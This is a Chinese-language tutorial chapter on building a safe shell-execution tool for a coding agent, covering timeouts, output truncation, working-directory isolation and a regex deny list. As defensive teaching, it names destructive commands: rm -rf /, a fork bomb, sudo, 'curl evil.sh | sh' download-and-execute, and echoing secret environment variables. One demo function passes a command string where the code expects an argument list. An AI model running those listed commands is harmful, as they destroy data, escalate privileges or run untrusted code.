1Shell 工具：agent 的脚

模块 01 给了 agent 一双手（读写文件）。但光有手还不够——agent 怎么知道自己改对了？怎么跑测试、跑构建、查看仓库状态、安装依赖？这些都要靠执行命令的能力。如果文件工具是手，那么Shell 工具就是 agent 的脚：它让 agent 能在真实环境里动起来，把意图变成对系统的实际操作。

Shell 工具的核心其实只有一行：用 Python 标准库的 subprocess.run 启动一个外部命令、等它结束、拿回它的输出。但「把这一行做对、做安全」却是本模块的全部重量所在。一个不设防的 shell 工具是编码 agent 里最危险的部件——它能让 LLM（无论出于错误还是被诱导）执行任意命令：删文件、读密钥、把整台机器搞瘫。所以本模块的主线不是「怎么跑命令」，而是怎么安全地跑命令：超时、输出捕获与截断、工作目录隔离、危险命令防护——这四道闸门，缺一不可。

还有一层对 LLM 友好的考量。命令跑完，agent 需要从结果里读出三样东西：成没成（返回码）、正常输出（stdout）、错误信息（stderr）。把这三样结构化地交给 LLM，它才能判断下一步——返回码非 0 说明失败、stderr 里的 traceback 指向出错位置、stdout 里的测试摘要说明还剩几个用例没过。Shell 工具的输出设计，直接决定了模块 04「解析测试结果、决定下一步改哪」做起来顺不顺。

一句话抓住本模块：能跑命令的 agent 是把双刃剑——锋利（能跑测试、能自动化一切）也危险（能毁掉一切）。本模块就是给这把剑装上四道保险：超时（防卡死）、截断（防撑爆窗口）、cwd 隔离（防乱跑）、危险命令拦截（防灾难）。把安全做进工具本身，而不是事后补。

2subprocess 基础：捕获三件套

subprocess 基础：启动命令、捕获三件套

先看最朴素的实现。subprocess.run 启动一个命令、阻塞到它结束，返回一个含返回码与输出的结果对象。给 agent 用，关键是这几个参数：

参数作用为什么 agent 必须用它
capture_output=True捕获 stdout / stderr 到结果对象agent 要读输出来判断结果，不能让它直接打到终端
text=True输出按文本（str）而非字节返回省去手动 decode，直接喂给 LLM
cwd=workspace在指定工作目录里执行把命令锁在工作区，相对路径不乱跑（见第 5 节）
timeout=N最长跑 N 秒，超时抛异常防死循环/卡住的命令挂死会话（见第 3 节）
shell=False命令以参数列表传入、不经 shell 解析避免 shell 注入（见第 6 节）
 
import subprocess
def run_command(work, argv, timeout=30):
    '''argv 是参数列表，如 ['python', '-m', 'pytest', '-q']。'''
    r = subprocess.run(argv, cwd=work, capture_output=True,
                       text=True, timeout=timeout)
    return {'returncode': r.returncode,
            'stdout': r.stdout,
            'stderr': r.stderr}

返回码（return code）是 agent 最该先看的信号：约定 0 表示成功、非 0 表示失败。它是结构化、无需解析的——agent 不必读懂满屏文本，先看一眼返回码就知道命令成没成，这是一种廉价而可靠的判断。stdout 与 stderr 则要分开捕获：约定俗成地，程序的正常结果走 stdout，诊断与错误走 stderr。pytest 的失败摘要主要在 stdout，而一个崩溃的 Python 脚本的 traceback 在 stderr——agent 要两路都看，才能拼出完整图景。

直白说

把 subprocess 想成 agent 派出去办事的信使：你给它一句命令（argv），它去执行，回来时带三样东西——办成了没（返回码）、它看到的正常情况（stdout）、它遇到的麻烦（stderr）。agent 据这三样决定下一步。

严谨说

形式上，每次命令执行是一个有副作用的子进程调用，其可观测结果被规约成 (returncode, stdout, stderr) 三元组。这个三元组就是 agent 在「行动」之后获得的「观察」（回到模块 00 的观察-行动循环）。三元组的设计——一个布尔式的成败信号 + 两路文本——既覆盖了快速判断，又保留了细节诊断，是给 LLM 的理想观察格式。

这里还藏着一个对解析极其重要的小动作，你会在 notebook 里看到它救了场：很多命令行工具（包括 pytest）会自动给输出加 ANSI 颜色码（让终端里红的红、绿的绿）。可这些颜色码（形如 \x1b[31m）混进文本后，会让后面（模块 04）想用正则去抓「FAILED test_x」「file:line:」的尝试全部落空——因为行首被一串不可见的转义序列占了。所以给 agent 跑这类工具时，要么显式关闭颜色（pytest 用 --color=no、或设环境变量 PY_COLORS=0），要么在解析前用正则把 ANSI 码剥掉。这是个不起眼却真实会咬人的坑，记住它：给 LLM/程序消费的输出，一律要纯净、无装饰。

一个新手陷阱：用 os.system() 或 subprocess.run(cmd, shell=True) 拼字符串跑命令。前者拿不到结构化输出，后者把命令交给 shell 解析、埋下注入风险（第 6 节）。给 agent 用，优先 参数列表 + shell=False：既能精确捕获三件套，又从根上避免了 shell 把特殊字符当语法解释。

3超时：防命令挂死会话

超时：防止一条命令挂死整个会话

第一道保险：超时。agent 跑的命令是 LLM 生成的，谁也不能保证它不会触发一个死循环（while True 的测试）、一个卡在等待输入的命令（python 进了交互模式等你敲东西）、或一个跑到天荒地老的构建。没有超时，这些会把整个 agent 会话永久挂起——比报错更糟，因为它连错都不报，就是干等。

解法是 subprocess.run(..., timeout=N)：超过 N 秒，subprocess 会杀掉子进程并抛 TimeoutExpired。agent 工具要捕获这个异常、把它转成一条对 LLM 友好的结果（「命令超时（>30s），已终止」），而非让异常冒泡崩掉整个循环。超时不是错误，而是一个正常的、预期内的结果——agent 据它知道「这条路走不通，换个法子」。

def run_command(work, argv, timeout=30):
    try:
        r = subprocess.run(argv, cwd=work, capture_output=True,
                           text=True, timeout=timeout)
        return {'returncode': r.returncode, 'stdout': r.stdout,
                'stderr': r.stderr, 'timed_out': False}
    except subprocess.TimeoutExpired as e:
        # 超时也要返回结构化结果（含已产生的部分输出），而非崩溃
        return {'returncode': -1, 'stdout': e.stdout or '', 'stderr': e.stderr or '',
                'timed_out': True, 'message': f'命令超时(>{timeout}s)，已终止'}

超时时长的选择是个权衡：太短会误杀本来就需要跑久的合理命令（大型测试套件、编译），太长则在卡死时让 agent 干等太久。实践中常按命令类型分级——快查（ls、grep）给几秒、跑测试给几十秒到几分钟、且让上层可配置。更稳妥的还会用进程组来终止：子进程可能又派生了孙进程，只杀直接子进程会留下孤儿；用 start_new_session=True 起一个进程组、超时时杀掉整组，才能斩草除根。本课用最简版（依赖 subprocess 自带的终止），但你要知道生产里这一步要做得更彻底。

超时是 agent 安全的基本人权，不是可选项。一个没有超时的 shell 工具，迟早会被某个 LLM 生成的死循环或交互式命令挂死，且毫无征兆。把超时设成工具的默认必填参数（而非可选、可省略），从接口层面强制每次调用都带它。记住：你永远无法预测 LLM 会生成什么命令，所以必须假设最坏情况。

4输出截断：别烧光上下文

输出截断：别让一条命令烧光上下文窗口

第二道保险：输出截断。一条命令可能吐出几万行输出——pip install 的进度、一个失败测试的海量日志、find / 的满屏路径。如果把这些原样回填进对话，会瞬间撑爆 LLM 的上下文窗口、烧掉大量 token（钱），还把真正有用的信息淹没在噪音里。所以 shell 工具必须限制输出长度。

好的截断策略不是简单砍掉尾巴，而是保留头尾、省略中间。原因是：一段输出最有价值的信息往往在开头（命令在干什么、初始报错）和结尾（最终结果、测试摘要、退出信息），中间大量重复的进度/日志价值最低。于是常见做法是：保留前 N 行 + 后 M 行，中间用一行 ... (省略 K 行) ... 标记。这样既控住了长度，又让 LLM 看到最关键的两端。

def truncate(text, head=40, tail=20):
    '''保留前 head 行 + 后 tail 行，中间省略并标注省了多少。'''
    lines = text.splitlines()
    if len(lines) <= head + tail:
        return text
    omitted = len(lines) - head - tail
    kept = lines[:head] + [f'... (省略 {omitted} 行) ...'] + lines[-tail:]
    return '\n'.join(kept)

直白说

截断就像给 agent 看一份长报告的「摘要版」：开头的背景 + 结尾的结论保留，中间的冗长细节折叠起来。LLM 通常靠这两端就能判断发生了什么；真要看中间，它可以再发一条更精确的命令（如只跑那一个失败的测试）。

严谨说

形式上，截断是在信息量 vs token 成本间做的有损压缩，且利用了输出的信息分布先验（两端密度高、中间冗余）。它和模块 01 的「按范围读」、prompt caching 是同一类工程——全都是在与上下文窗口这个硬约束搏斗。值得强调的是：截断的边界值（head/tail）本身是可调的 ACI 旋钮，调太狠会丢关键信息，调太松会浪费窗口。

截断不只省钱，还提质：把一个失败测试的 5000 行日志压成「头 40 + 尾 20」行，LLM 反而更容易抓住关键报错——信噪比提高了。这呼应模块 00 的洞察：agent 的能力上限是它「感官」的质量，而过载的、噪音淹没信号的输入，是劣质感官。少即是多。

5工作目录隔离

工作目录隔离：把命令锁在工作区里

第三道保险：工作目录隔离，和模块 01 的路径安全一脉相承。命令里满是相对路径（pytest tests/、cat config.py），这些相对路径相对哪里解析，取决于命令的当前工作目录（cwd）。如果不指定，子进程会继承 Python 进程的 cwd——那可能是你的家目录、项目根、谁知道哪里，命令就会在意料之外的地方读写。

解法很直接：subprocess.run(..., cwd=workspace) 把每条命令的工作目录钉死在工作区。这样 pytest 跑的是工作区里的测试、cat x.py 读的是工作区里的文件，相对路径再也不会乱跑。配合模块 01 的临时目录沙箱，agent 的整个文件视野就被框在一个可控、可清理的盒子里。

但要清醒：cwd 只约束了相对路径的起点，它挡不住绝对路径——命令里写 rm /etc/passwd 照样会去动系统文件，因为绝对路径不经 cwd 解析。所以 cwd 隔离是纵深防御的一层，不是全部：它管住了「不小心在错地方操作」，但管不住「故意用绝对路径越界」——后者要靠下一节的危险命令防护、以及终极的容器/沙箱隔离。本课用临时目录 + cwd + 危险命令拦截这几层叠加，已能挡住绝大多数事故。

环境变量也是隔离的一部分。子进程默认继承父进程的全部环境变量——包括你的 ANTHROPIC_API_KEY、AWS 密钥等。一个会跑命令的 agent，理论上能 echo $SECRET_KEY 把它们打出来、甚至外传。生产 agent 会用 env= 显式传一份清洗过的最小环境给子进程，而非裸继承。本课不深入，但你要知道：隔离不只是文件系统，还包括环境变量、网络——能跑命令的 agent，每一条对外通道都要审视。

6危险命令防护

危险命令防护：拦住灾难性操作

第四道、也是最关乎生死的一道保险：危险命令防护。即便有了 cwd 隔离，一个 LLM 生成的（或被 prompt injection 诱导的）命令仍可能是灾难性的：rm -rf /（删根）、rm -rf ~（删家目录）、:(){ :|:& };:（fork 炸弹）、curl evil.sh | sh（下载执行任意脚本）、sudo ...（提权）。这些一旦执行，后果不可逆。

防护有两种思路。黑名单（deny list）：维护一组危险模式，命令命中就拒绝。简单、覆盖常见灾难，但挡不住没想到的变体（攻击者总能绕，如 rm -fr /、加空格、变量拼接）。白名单（allow list）：只放行一组明确安全的命令（ls、cat、python -m pytest……），其余一律拒。更安全，但更死板——agent 想用一个没预料到的合理命令也会被挡。

DANGER_PATTERNS = [
    r'\brm\s+-[rf]',          # rm -rf / rm -fr / rm -r / rm -f
    r'\bsudo\b', r'\bmkfs\b', r'>\s*/dev/sd',   # 提权 / 格式化 / 写裸盘
    r':\(\)\s*\{',           # fork 炸弹 :(){ ...
    r'\bcurl\b.*\|\s*(sh|bash)', r'\bwget\b.*\|\s*(sh|bash)',  # 下载执行
]
import re
def is_dangerous(command_str):
    return any(re.search(pat, command_str) for pat in DANGER_PATTERNS)

def guarded_run(work, command_str, timeout=30):
    if is_dangerous(command_str):
        return {'returncode': -1, 'blocked': True,
                'message': f'命令被安全策略拒绝：{command_str!r}'}
    # 安全则执行（注意：演示用 shell 解析命令串；生产更推荐参数列表）
    return run_command(work, command_str, timeout=timeout)

直白说

黑名单像机场的违禁品清单（已知危险物拦下），白名单像「只准带这几样东西登机」。前者方便但总有漏网之鱼，后者安全但限制多。现实中常两者结合，再加上一道终极保险——把整个 agent 关在容器里跑，即便命令越界也困在容器内、毁不到宿主。

严谨说

形式上，这是在安全性 vs 能力之间取舍：白名单偏安全（默认拒绝、显式放行），黑名单偏能力（默认允许、显式拦截）。安全工程的共识是默认拒绝（fail-safe / deny by default）更稳健——但对一个要解决开放任务的编码 agent，过严的白名单会废掉它大半能力。所以业界实践是：黑名单拦明确灾难 + 容器/沙箱兜底 + 破坏性操作人在回路确认，多层叠加，而非指望单层完美。

务必清醒：没有任何单一防护是完美的。黑名单能被绕过、白名单会误伤、正则总有边界情况。本节的拦截是一层必要但不充分的防御——它的价值在于挡住绝大多数低级灾难和无心之失。真正的安全来自纵深：危险命令拦截 + cwd/路径隔离 + 临时目录 + 容器沙箱 + 最小权限 + 人在回路。本课教你装好前几层；上生产时，容器隔离和人工确认是不能省的最后两道。永远假设 agent 会执行最坏的命令，然后让环境扛得住。

7拼成 agent 的脚

把 Shell 工具拼成 agent 的「脚」

把四道保险叠起来，agent 就有了一双安全的脚。一次典型的「跑测试看结果」会这样走：

  1. 防护：命令先过 is_dangerous，灾难性命令直接拒；
  2. 隔离：在 cwd=workspace 里执行，相对路径锁在工作区；
  3. 限时：带 timeout，死循环/卡住会被终止并返回结构化超时；
  4. 截断：stdout/stderr 经 truncate 压到合理长度再回填；
  5. 结构化返回：把 (returncode, stdout, stderr, timed_out, blocked) 交给 LLM 当观察。

这个工具是模块 04（edit-test-fix 循环）的引擎之一：agent 改完代码，调它跑 python -m pytest，从返回码知道成没成、从（截断后的）输出知道哪些用例失败——再决定下一步。可以说，文件工具让 agent 能改，shell 工具让 agent 能验；改与验合起来，才有了「自我纠错」的可能。没有「验」，agent 只能盲改，永远不知道自己对没对。

值得点明这双「脚」与前两个模块的协同关系。shell 工具几乎从不孤立使用：它跑的命令里的相对路径，靠的是模块 01 同源的工作区约束；它 cat/查看文件的能力，与模块 01 的读文件互补（小文件用 read、跑命令产出的大输出用 shell+截断）；它最重要的搭档则是模块 04 的循环——循环每一轮的「跑测试」就是一次 shell 调用，循环据其返回码判收敛、据其输出（解析后）定位下一步。把这条链看清：搜索定位 → 文件读改 → shell 验证 → 循环迭代，shell 工具是其中把「改动」与「现实反馈」连起来的那一环。少了它，agent 改完代码就两眼一抹黑；有了它，每次改动都能立刻得到客观裁决。

回到 ACI 的视角：shell 工具的每个安全设计，同时也是一个对 LLM 友好的设计。超时返回「命令超时」比无声挂起，让 LLM 知道该换路；截断后的精简输出比海量日志，让 LLM 抓得住重点；拦截危险命令时返回「被拒绝，因为 X」，让 LLM 明白边界、换个安全的做法。安全与友好在这里是同一件事的两面：一个会给出清晰、有界、可操作反馈的工具，既保护了系统，也帮助了模型。这正是把工具当作给 LLM 的接口来设计的精髓。

现实参照：SWE-agent 的 shell 工具同样强调超时、输出限长与对 LLM 友好的反馈格式（ACI 的核心案例）；Claude Code 在执行命令前会对潜在危险操作征求确认（人在回路）。把本模块的四道保险理解透，你就理解了这些 agent「脚」的安全内核。清单见 references.md。

8研究前沿与开放问题

研究前沿与开放问题

  • 沙箱与隔离的强度：从 cwd 隔离到容器（Docker）、到微虚拟机（gVisor、Firecracker），隔离越强越安全但越重。怎么在「让 agent 真能跑命令」与「即便它跑了坏命令也毁不了东西」间取平衡，是 agent 基础设施的核心课题。
  • prompt injection 经由命令输出：agent 跑命令读到的输出里可能藏有恶意指令（如一个被污染的文件、一个返回恶意文本的 API），劫持 agent 去执行危险操作。如何不盲信工具输出，是 agent 安全的开放难题。
  • 交互式与长跑命令：很多真实命令需要交互（输入密码、确认 y/n）或长期运行（dev server）。如何让 agent 处理这类不符合「跑完即返回」模型的命令（伪终端 pty、后台进程管理），仍是工程难点。
  • 最小权限与能力声明：理想情况下，agent 跑某条命令前应声明它需要什么权限（读哪些文件、是否联网），由系统按最小权限授予。把这套「能力安全」机制做进 agent，是比黑/白名单更根本的方向。

必读：SWE-agent 论文（ACI 与 shell 工具设计）、OWASP 的 Command Injection 条目（注入成因与防御）、Anthropic《Building effective agents》（agent 安全与最小脚手架）。Python subprocess 官方文档是本模块的标准库依据。清单见 references.md。
